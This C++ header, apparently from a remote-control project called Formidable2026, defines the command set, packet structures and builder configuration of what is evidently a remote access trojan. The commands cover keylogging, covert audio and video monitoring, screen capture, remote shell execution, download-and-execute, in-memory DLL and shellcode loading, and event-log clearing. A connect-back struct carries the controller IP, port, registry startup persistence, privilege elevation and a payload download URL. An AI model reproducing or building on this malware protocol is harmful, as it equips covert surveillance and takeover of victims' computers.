/**
 * Formidable2026 - Common Configuration
 * Encoding: UTF-8 BOM
 */
#ifndef FORMIDABLE_CONFIG_H
#define FORMIDABLE_CONFIG_H
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <cstdint>
#pragma comment(lib, "ws2_32.lib")
namespace Formidable {
    const std::string VERSION = "2026.1.0";
    const int DEFAULT_PORT = 8080;
    const char MASTER_HASH[] = "Formidable2026_Auth_Key";
    // 命令定义
    enum CommandType : uint32_t {
        CMD_UNKNOWN = 0,
        CMD_HEARTBEAT = 1,      // 心跳
        CMD_GET_SYSINFO = 10,   // 获取系统信息
        
        // 文件管理 (20-39)
        CMD_FILE_LIST = 20,     // 获取文件列表
        CMD_FILE_DOWNLOAD = 21, // 下载文件
        CMD_FILE_UPLOAD = 22,   // 上传文件
        CMD_FILE_DELETE = 23,   // 删除文件
        CMD_FILE_RENAME = 24,   // 重命名文件
        CMD_FILE_RUN = 25,      // 运行文件
        CMD_FILE_DATA = 26,     // 文件数据块传输
        CMD_DRIVE_LIST = 27,    // 获取磁盘驱动器列表
        CMD_FILE_MKDIR = 28,    // 创建文件夹
        CMD_FILE_DOWNLOAD_DIR = 29, // 递归下载文件夹
        CMD_FILE_SIZE = 30,     // 文件大小
        CMD_FILE_SEARCH = 31,   // 文件搜索
        CMD_FILE_COMPRESS = 32, // 压缩文件
        CMD_FILE_UNCOMPRESS = 33, // 解压文件
        
        // 进程管理 (40-49)
        CMD_PROCESS_LIST = 40,  // 获取进程列表
        CMD_PROCESS_KILL = 41,  // 结束进程
        CMD_PROCESS_MODULES = 42, // 获取进程模块列表
        CMD_PROCESS_SUSPEND = 43, // 挂起进程
        CMD_PROCESS_RESUME = 44, // 恢复进程
        
        // 窗口/桌面管理 (50-59)
        CMD_WINDOW_LIST = 50,   // 获取窗口列表
        CMD_SCREEN_CAPTURE = 51, // 屏幕截图/监控
        CMD_WINDOW_SNAPSHOT = 52, // 窗口预览截图
        CMD_WINDOW_CTRL = 53,   // 窗口控制 (最大化/最小化/关闭等)
        CMD_MOUSE_EVENT = 54,   // 鼠标事件
        CMD_KEY_EVENT = 55,     // 键盘事件
        CMD_SCREEN_FPS = 56,    // 设置屏幕帧率
        CMD_SCREEN_QUALITY = 57, // 设置屏幕质量/分辨率
        CMD_SCREEN_COMPRESS = 58, // 设置压缩方案
        CMD_SCREEN_LOCK_INPUT = 59, // 锁定远程输入
        CMD_SCREEN_BLANK = 48,  // 黑屏
        CMD_SWITCH_MONITOR = 49, // 切换显示器
        
        // 终端管理 (60-69)
        CMD_TERMINAL_OPEN = 60, // 打开终端
        CMD_TERMINAL_DATA = 61, // 终端数据
        CMD_SHELL_EXEC = 62,    // 远程执行命令 (WinExec)
        CMD_TERMINAL_CLOSE = 63,// 关闭终端
        
        // 语音/视频 (70-79)
        CMD_VOICE_STREAM = 70,  // 语音监听
        CMD_VIDEO_STREAM = 71,  // 视频监控
        CMD_AUDIO_START = 72,   // 开始录音
        CMD_AUDIO_STOP = 73,    // 停止录音
        
        // 系统管理 (80-89)
        CMD_SERVICE_LIST = 80,  // 服务管理
        CMD_REGISTRY_CTRL = 81, // 注册表管理
        CMD_SESSION_MANAGE = 82,// 会话管理（关机/重启/注销）
        CMD_SERVICE_START = 83, // 启动服务
        CMD_SERVICE_STOP = 84,  // 停止服务
        CMD_SERVICE_DELETE = 85,// 删除服务
        CMD_POWER_SHUTDOWN = 86,// 关机
        CMD_POWER_REBOOT = 87,  // 重启
        CMD_POWER_LOGOUT = 88,  // 注销
        CMD_CLEAN_EVENT_LOG = 89, // 清除事件日志
        
        // 辅助功能 (90-99)
        CMD_KEYLOG = 90,        // 键盘记录
        CMD_CLIPBOARD_GET = 91, // 获取剪贴板
        CMD_CLIPBOARD_SET = 92, // 设置剪贴板
        CMD_SETTINGS = 93,      // 参数设置
        CMD_GEN_SERVICE = 94,   // 生成服务
        CMD_PROXY_MAP = 95,     // 代理映射
        CMD_DOWNLOAD_EXEC = 96, // 下载并执行
        CMD_UPLOAD_EXEC = 97,   // 上传并执行
        CMD_OPEN_URL = 98,      // 打开URL
        CMD_UPDATE_CLIENT = 99, // 更新客户端
        
        CMD_LOAD_MODULE = 100,  // 内存加载模块 (DLL)
        CMD_UNINSTALL = 101,    // 卸载客户端
        CMD_RECONNECT = 102,    // 重新连接
        CMD_EXECUTE_DLL = 103,  // 执行DLL代码
        CMD_EXECUTE_SHELLCODE = 104, // 执行ShellCode
        
        // 群控专用命令
        CMD_SET_GROUP = 105,    // 设置客户端分组
        CMD_MESSAGEBOX = 106,   // 弹出消息框
        
        CMD_EXIT = 999          // 退出
    };

#pragma pack(push, 1)
    struct ProcessInfo {
        uint32_t pid;
        uint32_t threads;
        uint32_t priority;
        char name[256];
        char path[MAX_PATH];
        char arch[8]; // x86 or x64
        char owner[64]; // Process owner (User)
        uint64_t workingSet; // Memory usage (Working Set)
        float cpuUsage;      // CPU usage percentage
    };
    struct ModuleInfo {
       uint64_t baseAddr;
        uint32_t size;
        char name[256];
        char path[MAX_PATH];
    };
    struct ServiceInfo {
        char name[256];
        char displayName[256];
        uint32_t status;
        uint32_t startType;
    };
    struct WindowInfo {
        uint64_t hWnd;
        char title[256];
        int32_t isVisible;
    };
#pragma pack(pop)

#pragma pack(push, 1)
    struct RemoteMouseEvent {
        uint32_t msg;   // WM_LBUTTONDOWN, etc.
        int32_t x;
        int32_t y;
        uint32_t data;
    };
    struct RemoteKeyEvent {
        uint32_t msg;
        uint32_t vk;
    };
#pragma pack(pop)

#pragma pack(push, 1)
    struct CONNECT_ADDRESS {
        char        szFlag[32];      // 标识
        char        szServerIP[100]; // 主控IP
        char        szPort[8];       // 主控端口
        int32_t     iType;           // 客户端类型
        int32_t     bEncrypt;        // 上线信息是否加密
        char        szBuildDate[12]; // 构建日期(版本)
        int32_t     iMultiOpen;      // 支持打开多个
        int32_t     iStartup;        // 启动方式
        int32_t     iHeaderEnc;      // 数据加密类型
        char        protoType;       // 协议类型
        char        runningType;     // 运行方式
        char        payloadType;     // 载荷类型 (0:内嵌, 1:下载, 2:远程加载)
        char        szGroupName[24]; // 分组名称
        char        runasAdmin;      // 是否提升权限运行
        char        szInstallDir[MAX_PATH];  // 安装目录
        char        szInstallName[MAX_PATH]; // 程序名称
        char        szDownloadUrl[512];      // 下载地址
        char        szReserved[10];  // 占位
        uint64_t    clientID;        // 客户端唯一标识
        uint64_t    parentHwnd;      // 父进程窗口句柄
        uint64_t    superAdmin;      // 管理员主控ID
        char        pwdHash[64];     // 密码哈希
    };
    struct PkgHeader {
        char flag[8];       // "FRMD26?"
        int32_t totalLen;   // 整个包长度 (Header + Body)
        int32_t originLen;  // Body 长度
    };
    struct CommandPkg {
        uint32_t cmd;       // CommandType
        uint32_t arg1;
        uint32_t arg2;
        char data[1];       // 变长数据
    };
    struct ClientInfo {
        char osVersion[64];
        char computerName[64];
        char userName[64];
        char cpuInfo[128];       // CPU型号
        char lanAddr[64];       // LAN 地址
        char activeWindow[256]; // 当前活动窗口
        char installTime[64];   // 安装/上线时间
        char uptime[64];        // 系统运行时间
        char version[32];       // 客户端版本
        uint32_t processID;
        int32_t rtt;            // 延迟
        int32_t is64Bit;        // 使用int32代替bool
        int32_t isAdmin;
        int32_t hasCamera;
        int32_t clientType;     // 客户端类型
        wchar_t remark[256];    // 客户端备注
        wchar_t group[128];     // 客户端分组
    };
#pragma pack(pop)
    // 默认上线配置（用于特征匹配和生成服务端替换）
    const CONNECT_ADDRESS DEFAULT_CONFIG = {
        "FRMD26_CONFIG",        // szFlag
        "127.0.0.1",            // szServerIP
        "8080",                 // szPort
        0,                      // iType
        0,                      // bEncrypt
        "2026-02-04",           // szBuildDate
        1,                      // iMultiOpen
        1,                      // iStartup (1: Registry)
        1,                      // iHeaderEnc (1: HELL)
        0,                      // protoType (0: TCP)
        0,                      // runningType (0: Random)
        0,                      // payloadType (0: Embedded)
        "default",              // szGroupName
        1,                      // runasAdmin (1: Yes)
        "",                     // szInstallDir
        "",                     // szInstallName
        "",                     // szDownloadUrl
        "",                     // szReserved
        0,                      // clientID
        0,                      // parentHwnd
        0,                      // superAdmin
        ""                      // pwdHash
    };
}
#endif // FORMIDABLE_CONFIG_H
